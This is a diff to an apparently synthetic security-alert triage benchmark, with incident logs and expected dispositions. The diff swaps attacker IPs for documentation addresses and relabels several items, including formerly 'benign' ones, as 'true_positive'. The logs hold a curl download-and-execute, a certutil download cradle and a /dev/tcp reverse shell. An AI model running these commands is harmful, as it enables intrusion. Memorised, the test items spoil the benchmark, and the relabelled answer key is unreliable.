@@ -7,7 +7,7 @@
    "id": "INC-EVAL-001",
    "provenance": "synthetic",
    "title": "Spear-phishing email with macro-laden attachment delivered to dave@example.com",
-   "description": "Inbound email from 45.142.122.111 delivered an Office document with a malicious VBA macro to dave@example.com. Attachment opened on WIN-DC-PRIMARY; macro spawned cmd.exe and downloaded a stage-2 payload from a known Lazarus infrastructure.",
+   "description": "Inbound email from 203.0.113.111 delivered an Office document with a malicious VBA macro to dave@example.com. Attachment opened on WIN-DC-PRIMARY; macro spawned cmd.exe and downloaded a stage-2 payload from a known Lazarus infrastructure.",
    "severity": "high",
    "raw_alert": {
     "title": "Spear-phishing email with macro-laden attachment delivered to dave@example.com",
@@ -20,7 +20,7 @@
      "Workload": "Exchange",
      "Operation": "Send",
      "UserId": "dave@example.com",
-     "ClientIP": "45.142.122.111",
+     "ClientIP": "203.0.113.111",
      "Subject": "Q4 invoice (action required)",
      "AttachmentNames": [
       "invoice_q4.docm"
@@ -46,7 +46,7 @@
      "threat_actor": "Lazarus"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1566.001",
     "T1059.005"
@@ -90,7 +90,7 @@
      "rule_match": "WAF:SSRF:2007"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1190",
     "T1082"
@@ -131,7 +131,7 @@
      "threat_actor": "Lazarus"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1189",
     "T1203"
@@ -184,7 +184,7 @@
      "dest_port": 4444
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1195.001",
     "T1059.007"
@@ -225,7 +225,7 @@
      "CommandLine": "python.exe E:\\autorun.py --stage C:\\Temp\\"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1091",
     "T1005"
@@ -240,7 +240,7 @@
    "id": "INC-EVAL-006",
    "provenance": "synthetic",
    "title": "OAuth consent phishing targeting ceo@example.com",
-   "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@example.com. Inbox forwarding rule created sending mail to 91.134.231.15.",
+   "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@example.com. Inbox forwarding rule created sending mail to 192.0.2.15.",
    "severity": "high",
    "raw_alert": {
     "title": "OAuth consent phishing targeting ceo@example.com",
@@ -267,12 +267,12 @@
      "UserId": "ceo@example.com",
      "Parameters": {
       "Name": "Auto-fwd",
-      "ForwardTo": "ext@91.134.231.15",
+      "ForwardTo": "ext@192.0.2.15",
       "DeleteMessage": true
      }
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1528",
     "T1550.001"
@@ -317,7 +317,7 @@
      "threat_actor": "MagicWeb"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1059.001",
     "T1027"
@@ -362,7 +362,7 @@
      "Protocol": "tcp"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1105",
     "T1218.009"
@@ -410,7 +410,7 @@
      "user": "root"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1610",
     "T1059.004",
@@ -457,7 +457,7 @@
      "Destination": "powershell.exe -enc <encoded>"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1546.003",
     "T1059.001"
@@ -500,7 +500,7 @@
      "threat_actor": "Volt Typhoon"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1547.001"
    ],
@@ -540,7 +540,7 @@
      "User": "carol@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1053.005"
    ],
@@ -575,7 +575,7 @@
      "indicator_path": "ESP:/EFI/Boot/bootx64.efi"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1542.001",
     "T1027.002"
@@ -615,7 +615,7 @@
      "hostname": "WIN-HR-DESKTOP"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1053.003",
     "T1071.001"
@@ -657,7 +657,7 @@
      "User": "SYSTEM"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1548.002"
    ],
@@ -720,7 +720,7 @@
      "user": "root"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1611",
     "T1082"
@@ -764,7 +764,7 @@
      "user": "svc-deploy@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1548.001"
    ],
@@ -817,7 +817,7 @@
      "threat_actor": "Scattered Spider"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1055.012",
     "T1620"
@@ -861,7 +861,7 @@
      "CommandLine": "wevtutil cl Security"
     }
    ],
-   "expected_disposition": "suspicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1070.001"
    ],
@@ -911,7 +911,7 @@
      "User": "eve@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1562.001"
    ],
@@ -956,7 +956,7 @@
      "User": "carol@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1003.001"
    ],
@@ -969,11 +969,11 @@
   {
    "id": "INC-EVAL-022",
    "provenance": "synthetic",
-   "title": "Brute-force credential spray against svc-deploy@example.com from 45.142.122.111",
-   "description": "Credential spray from 45.142.122.111 against svc-deploy@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
+   "title": "Brute-force credential spray against svc-deploy@example.com from 203.0.113.111",
+   "description": "Credential spray from 203.0.113.111 against svc-deploy@example.com. 1500 password attempts in 30 minutes. One success followed by anomalous Azure AD sign-in.",
    "severity": "high",
    "raw_alert": {
-    "title": "Brute-force credential spray against svc-deploy@example.com from 45.142.122.111",
+    "title": "Brute-force credential spray against svc-deploy@example.com from 203.0.113.111",
     "severity": "high",
     "template_id": "credential-spray"
    },
@@ -982,7 +982,7 @@
      "source": "azure_signin",
      "category": "SignInLogs",
      "userPrincipalName": "svc-deploy@example.com",
-     "ipAddress": "45.142.122.111",
+     "ipAddress": "203.0.113.111",
      "resultType": 50126,
      "resultDescription": "Invalid username or password",
      "appDisplayName": "Office 365 Exchange Online",
@@ -992,14 +992,14 @@
      "source": "azure_signin",
      "category": "SignInLogs",
      "userPrincipalName": "svc-deploy@example.com",
-     "ipAddress": "45.142.122.111",
+     "ipAddress": "203.0.113.111",
      "resultType": 0,
      "resultDescription": "Success",
      "conditionalAccessStatus": "success",
      "riskLevelAggregated": "high"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1110.003"
    ],
@@ -1044,7 +1044,7 @@
      "IpAddress": "MAC-CFO-LAPTOP"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1558.003",
     "T1021.001"
@@ -1080,7 +1080,7 @@
      "ClientIP": "AWS-EC2-PROD-API"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1003.006",
     "T1078.002"
@@ -1131,7 +1131,7 @@
      ]
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1606.002",
     "T1087.002"
@@ -1177,7 +1177,7 @@
      "EventCount": 8400
     }
    ],
-   "expected_disposition": "benign",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1087.002"
    ],
@@ -1221,7 +1221,7 @@
      "EventCount": 256
     }
    ],
-   "expected_disposition": "benign",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1135"
    ],
@@ -1265,7 +1265,7 @@
      "threat_actor": "APT28"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1550.002",
     "T1558.001"
@@ -1301,7 +1301,7 @@
      "EventTimeUTC": "03:14:00Z"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1021.001"
    ],
@@ -1315,7 +1315,7 @@
    "id": "INC-EVAL-030",
    "provenance": "synthetic",
    "title": "WMI lateral execution from WIN-PROD-WEB02 to AWS-EC2-PROD-API",
-   "description": "wmic.exe /node:AWS-EC2-PROD-API process call create observed from WIN-PROD-WEB02 by dave@example.com. Remote command execution; payload from 91.134.231.15.",
+   "description": "wmic.exe /node:AWS-EC2-PROD-API process call create observed from WIN-PROD-WEB02 by dave@example.com. Remote command execution; payload from 192.0.2.15.",
    "severity": "high",
    "raw_alert": {
     "title": "WMI lateral execution from WIN-PROD-WEB02 to AWS-EC2-PROD-API",
@@ -1331,10 +1331,10 @@
      "Computer": "WIN-PROD-WEB02",
      "User": "dave@example.com",
      "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
-     "CommandLine": "wmic /node:AWS-EC2-PROD-API process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
+     "CommandLine": "wmic /node:AWS-EC2-PROD-API process call create \"cmd /c curl http://192.0.2.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1047"
    ],
@@ -1367,7 +1367,7 @@
      "bytes": 10700000000
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1005",
     "T1041"
@@ -1411,7 +1411,7 @@
      "User": "ops-lead@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1115"
    ],
@@ -1443,7 +1443,7 @@
      "qps": 240
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1071.004",
     "T1048.003"
@@ -1458,7 +1458,7 @@
    "id": "INC-EVAL-034",
    "provenance": "synthetic",
    "title": "Cloud storage exfil: data egress to attacker-controlled S3 from WIN-DC-PRIMARY",
-   "description": "Egress from WIN-DC-PRIMARY to s3://atk-stage-91.134.231.15/dump/ by carol@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
+   "description": "Egress from WIN-DC-PRIMARY to s3://atk-stage-192.0.2.15/dump/ by carol@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
    "severity": "critical",
    "raw_alert": {
     "title": "Cloud storage exfil: data egress to attacker-controlled S3 from WIN-DC-PRIMARY",
@@ -1477,17 +1477,17 @@
      },
      "sourceIPAddress": "WIN-DC-PRIMARY",
      "requestParameters": {
-      "bucketName": "atk-stage-91.134.231.15",
+      "bucketName": "atk-stage-192.0.2.15",
       "key": "dump/customers.tar.gz"
      },
      "resources": [
       {
-       "ARN": "arn:aws:s3:::atk-stage-91.134.231.15/dump/customers.tar.gz"
+       "ARN": "arn:aws:s3:::atk-stage-192.0.2.15/dump/customers.tar.gz"
       }
      ]
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1567.002"
    ],
@@ -1521,7 +1521,7 @@
      "file_count": 812
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1567.002",
     "T1005"
@@ -1565,7 +1565,7 @@
      "threat_actor": "Scattered Spider"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1568.002"
    ],
@@ -1602,7 +1602,7 @@
      "jitter_pct": 2
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1071.001"
    ],
@@ -1654,7 +1654,7 @@
      "threat_actor": "LockBit 3.0"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1486"
    ],
@@ -1688,7 +1688,7 @@
      "cpu_pct": 95
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1496"
    ],
@@ -1722,7 +1722,7 @@
      "threat_actor": "ALPHV/BlackCat"
     }
    ],
-   "expected_disposition": "suspicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1566.001",
     "T1657"
@@ -1781,7 +1781,7 @@
      }
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1530",
     "T1567.002"
@@ -1792,7 +1792,7 @@
    "id": "INC-EVAL-042",
    "provenance": "synthetic",
    "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for grace@example.com",
-   "description": "Successful Azure AD sign-in for grace@example.com from 45.142.122.111 (impossible-travel from prior location). MFA satisfied via stolen session token.",
+   "description": "Successful Azure AD sign-in for grace@example.com from 203.0.113.111 (impossible-travel from prior location). MFA satisfied via stolen session token.",
    "severity": "critical",
    "raw_alert": {
     "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for grace@example.com",
@@ -1804,7 +1804,7 @@
      "source": "azure_signin",
      "category": "SignInLogs",
      "userPrincipalName": "grace@example.com",
-     "ipAddress": "45.142.122.111",
+     "ipAddress": "203.0.113.111",
      "location": {
       "city": "Vladivostok",
       "countryOrRegion": "RU"
@@ -1823,7 +1823,7 @@
      "riskLevelAggregated": "high"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1078.004",
     "T1550.001"
@@ -1857,7 +1857,7 @@
      "duration_secs": 720
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1498.001"
    ],
@@ -1892,7 +1892,7 @@
      "Bytes": 8300000000
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1114.002",
     "T1567.002"
@@ -1907,7 +1907,7 @@
    "id": "INC-EVAL-045",
    "provenance": "synthetic",
    "title": "Malicious Office add-in installed for grace@example.com",
-   "description": "Office VSTO add-in registered under HKCU for grace@example.com on WIN-EXCHANGE-01; loads on every Outlook startup; beacons to 185.220.101.7.",
+   "description": "Office VSTO add-in registered under HKCU for grace@example.com on WIN-EXCHANGE-01; loads on every Outlook startup; beacons to 198.51.100.7.",
    "severity": "high",
    "raw_alert": {
     "title": "Malicious Office add-in installed for grace@example.com",
@@ -1933,11 +1933,11 @@
      "EventID": 3,
      "Computer": "WIN-EXCHANGE-01",
      "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
-     "DestinationIp": "185.220.101.7",
+     "DestinationIp": "198.51.100.7",
      "DestinationPort": 443
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1137.006",
     "T1071.001"
@@ -1947,11 +1947,11 @@
   {
    "id": "INC-EVAL-046",
    "provenance": "synthetic",
-   "title": "GitHub PAT leaked and abused from 185.220.101.7",
-   "description": "Personal access token belonging to grace@example.com used from 185.220.101.7 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
+   "title": "GitHub PAT leaked and abused from 198.51.100.7",
+   "description": "Personal access token belonging to grace@example.com used from 198.51.100.7 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
    "severity": "critical",
    "raw_alert": {
-    "title": "GitHub PAT leaked and abused from 185.220.101.7",
+    "title": "GitHub PAT leaked and abused from 198.51.100.7",
     "severity": "critical",
     "template_id": "github-pat-leak"
    },
@@ -1960,7 +1960,7 @@
      "source": "github_audit",
      "action": "git.clone",
      "actor": "grace@example.com",
-     "actor_ip": "185.220.101.7",
+     "actor_ip": "198.51.100.7",
      "repo_count": 14,
      "programmatic_access_type": "personal_access_token",
      "user_agent": "git/2.40.0"
@@ -1975,7 +1975,7 @@
      "secret_detected": "github_pat_*"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1552.001",
     "T1213.003"
@@ -2020,7 +2020,7 @@
      "userAgent": "aws-cli/2.13"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1552.005",
     "T1078.004"
@@ -2031,7 +2031,7 @@
    "id": "INC-EVAL-048",
    "provenance": "synthetic",
    "title": "Vendor admin password reset abuse for ops-lead@example.com",
-   "description": "Password reset for ops-lead@example.com performed by helpdesk in response to social-engineering call from 185.220.101.7. Token claimed within 90 seconds.",
+   "description": "Password reset for ops-lead@example.com performed by helpdesk in response to social-engineering call from 198.51.100.7. Token claimed within 90 seconds.",
    "severity": "high",
    "raw_alert": {
     "title": "Vendor admin password reset abuse for ops-lead@example.com",
@@ -2051,12 +2051,12 @@
      "source": "azure_signin",
      "category": "SignInLogs",
      "userPrincipalName": "ops-lead@example.com",
-     "ipAddress": "185.220.101.7",
+     "ipAddress": "198.51.100.7",
      "resultType": 0,
      "seconds_after_reset": 87
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1566.004",
     "T1078"
@@ -2090,7 +2090,7 @@
      "resourceDisplayName": "Microsoft Graph"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1550.001"
    ],
@@ -2143,7 +2143,7 @@
      "cve_layer_count": 2
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1195.002",
     "T1610"
@@ -2176,7 +2176,7 @@
      "threat_actor": "MagicWeb"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1564.008",
     "T1114.003"
@@ -2211,7 +2211,7 @@
      "user": "carol@example.com"
     }
    ],
-   "expected_disposition": "suspicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1070.002"
    ],
@@ -2255,7 +2255,7 @@
      "secret_detected": true
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1195.002",
     "T1552.004"
@@ -2294,7 +2294,7 @@
      "EventCount": 128
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1078.004",
     "T1021.002"
@@ -2329,7 +2329,7 @@
      "LogonType": 5
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1078.001",
     "T1070.001"
@@ -2383,7 +2383,7 @@
      "threat_actor": "Scattered Spider"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1566.001",
     "T1059.005"
@@ -2427,7 +2427,7 @@
      "rule_match": "WAF:SSRF:2007"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1190",
     "T1082"
@@ -2468,7 +2468,7 @@
      "threat_actor": "APT29"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1189",
     "T1203"
@@ -2521,7 +2521,7 @@
      "dest_port": 4444
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1195.001",
     "T1059.007"
@@ -2562,7 +2562,7 @@
      "CommandLine": "python.exe E:\\autorun.py --stage C:\\Temp\\"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1091",
     "T1005"
@@ -2609,7 +2609,7 @@
      }
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1528",
     "T1550.001"
@@ -2654,7 +2654,7 @@
      "threat_actor": "LockBit 3.0"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1059.001",
     "T1027"
@@ -2669,7 +2669,7 @@
    "id": "INC-EVAL-063",
    "provenance": "synthetic",
    "title": "Living-off-the-land: certutil download cradle on WIN-PROD-WEB02",
-   "description": "certutil.exe -urlcache invoked from cmd.exe on WIN-PROD-WEB02. cmd.exe was spawned by outlook.exe. Payload downloaded from 91.134.231.15.",
+   "description": "certutil.exe -urlcache invoked from cmd.exe on WIN-PROD-WEB02. cmd.exe was spawned by outlook.exe. Payload downloaded from 192.0.2.15.",
    "severity": "high",
    "raw_alert": {
     "title": "Living-off-the-land: certutil download cradle on WIN-PROD-WEB02",
@@ -2685,7 +2685,7 @@
      "Computer": "WIN-PROD-WEB02",
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-     "CommandLine": "certutil -urlcache -split -f http://91.134.231.15/p.exe %TEMP%\\p.exe"
+     "CommandLine": "certutil -urlcache -split -f http://192.0.2.15/p.exe %TEMP%\\p.exe"
     },
     {
      "source": "sysmon",
@@ -2694,12 +2694,12 @@
      "EventID": 3,
      "Computer": "WIN-PROD-WEB02",
      "Image": "C:\\Windows\\System32\\certutil.exe",
-     "DestinationIp": "91.134.231.15",
+     "DestinationIp": "192.0.2.15",
      "DestinationPort": 80,
      "Protocol": "tcp"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1105",
     "T1218.009"
@@ -2747,7 +2747,7 @@
      "user": "root"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1610",
     "T1059.004",
@@ -2794,7 +2794,7 @@
      "Destination": "powershell.exe -enc <encoded>"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1546.003",
     "T1059.001"
@@ -2837,7 +2837,7 @@
      "threat_actor": "Lazarus"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1547.001"
    ],
@@ -2877,7 +2877,7 @@
      "User": "cfo@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1053.005"
    ],
@@ -2912,7 +2912,7 @@
      "indicator_path": "ESP:/EFI/Boot/bootx64.efi"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1542.001",
     "T1027.002"
@@ -2927,7 +2927,7 @@
    "id": "INC-EVAL-069",
    "provenance": "synthetic",
    "title": "Backdoor cron job installed on LIN-DB-REPLICA",
-   "description": "/etc/cron.d entry created by ceo@example.com on LIN-DB-REPLICA. Reverse shell beacon to 45.142.122.111 every 5 minutes.",
+   "description": "/etc/cron.d entry created by ceo@example.com on LIN-DB-REPLICA. Reverse shell beacon to 203.0.113.111 every 5 minutes.",
    "severity": "high",
    "raw_alert": {
     "title": "Backdoor cron job installed on LIN-DB-REPLICA",
@@ -2948,11 +2948,11 @@
     {
      "source": "linux_journald",
      "_SYSTEMD_UNIT": "cron.service",
-     "MESSAGE": "(root) CMD (/bin/bash -i >& /dev/tcp/45.142.122.111/4444 0>&1)",
+     "MESSAGE": "(root) CMD (/bin/bash -i >& /dev/tcp/203.0.113.111/4444 0>&1)",
      "hostname": "LIN-DB-REPLICA"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1053.003",
     "T1071.001"
@@ -2994,7 +2994,7 @@
      "User": "SYSTEM"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1548.002"
    ],
@@ -3057,7 +3057,7 @@
      "user": "root"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1611",
     "T1082"
@@ -3101,7 +3101,7 @@
      "user": "bob@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1548.001"
    ],
@@ -3115,7 +3115,7 @@
    "id": "INC-EVAL-073",
    "provenance": "synthetic",
    "title": "Memory-only fileless implant in svchost on LIN-EDGE-VPN02",
-   "description": "Process hollowing detected on LIN-EDGE-VPN02: svchost.exe replaced with Cobalt Strike beacon to 45.142.122.111. No disk artefacts. Linked to LockBit 3.0.",
+   "description": "Process hollowing detected on LIN-EDGE-VPN02: svchost.exe replaced with Cobalt Strike beacon to 203.0.113.111. No disk artefacts. Linked to LockBit 3.0.",
    "severity": "critical",
    "raw_alert": {
     "title": "Memory-only fileless implant in svchost on LIN-EDGE-VPN02",
@@ -3141,7 +3141,7 @@
      "EventID": 3,
      "Computer": "LIN-EDGE-VPN02",
      "Image": "C:\\Windows\\System32\\svchost.exe",
-     "DestinationIp": "45.142.122.111",
+     "DestinationIp": "203.0.113.111",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "ja3": "a0e9f5d64349fb13191bc781f81f42e1"
@@ -3154,7 +3154,7 @@
      "threat_actor": "LockBit 3.0"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1055.012",
     "T1620"
@@ -3198,7 +3198,7 @@
      "CommandLine": "wevtutil cl Security"
     }
    ],
-   "expected_disposition": "suspicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1070.001"
    ],
@@ -3248,7 +3248,7 @@
      "User": "admin@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1562.001"
    ],
@@ -3293,7 +3293,7 @@
      "User": "cfo@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1003.001"
    ],
@@ -3336,7 +3336,7 @@
      "riskLevelAggregated": "high"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1110.003"
    ],
@@ -3381,7 +3381,7 @@
      "IpAddress": "WIN-FILE-SHARE"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1558.003",
     "T1021.001"
@@ -3417,7 +3417,7 @@
      "ClientIP": "AZURE-VM-FIN-001"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1003.006",
     "T1078.002"
@@ -3468,7 +3468,7 @@
      ]
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1606.002",
     "T1087.002"
@@ -3514,7 +3514,7 @@
      "EventCount": 8400
     }
    ],
-   "expected_disposition": "benign",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1087.002"
    ],
@@ -3558,7 +3558,7 @@
      "EventCount": 256
     }
    ],
-   "expected_disposition": "benign",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1135"
    ],
@@ -3602,7 +3602,7 @@
      "threat_actor": "MosaicRegressor"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1550.002",
     "T1558.001"
@@ -3638,7 +3638,7 @@
      "EventTimeUTC": "03:14:00Z"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1021.001"
    ],
@@ -3652,7 +3652,7 @@
    "id": "INC-EVAL-085",
    "provenance": "synthetic",
    "title": "WMI lateral execution from WIN-FILE-SHARE to MAC-CFO-LAPTOP",
-   "description": "wmic.exe /node:MAC-CFO-LAPTOP process call create observed from WIN-FILE-SHARE by svc-backup@example.com. Remote command execution; payload from 91.134.231.15.",
+   "description": "wmic.exe /node:MAC-CFO-LAPTOP process call create observed from WIN-FILE-SHARE by svc-backup@example.com. Remote command execution; payload from 192.0.2.15.",
    "severity": "high",
    "raw_alert": {
     "title": "WMI lateral execution from WIN-FILE-SHARE to MAC-CFO-LAPTOP",
@@ -3668,10 +3668,10 @@
      "Computer": "WIN-FILE-SHARE",
      "User": "svc-backup@example.com",
      "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
-     "CommandLine": "wmic /node:MAC-CFO-LAPTOP process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
+     "CommandLine": "wmic /node:MAC-CFO-LAPTOP process call create \"cmd /c curl http://192.0.2.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1047"
    ],
@@ -3704,7 +3704,7 @@
      "bytes": 10700000000
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1005",
     "T1041"
@@ -3748,7 +3748,7 @@
      "User": "bob@example.com"
     }
    ],
-   "expected_disposition": "malicious",
+   "expected_disposition": "true_positive",
    "expected_techniques": [
     "T1115"
    ],
@@ -3762,7 +3762,7 @@
    "id": "INC-EVAL-088",
    "provenance": "synthetic",
    "title": "DNS tunnelling exfiltration from WIN-DC-SECONDARY",
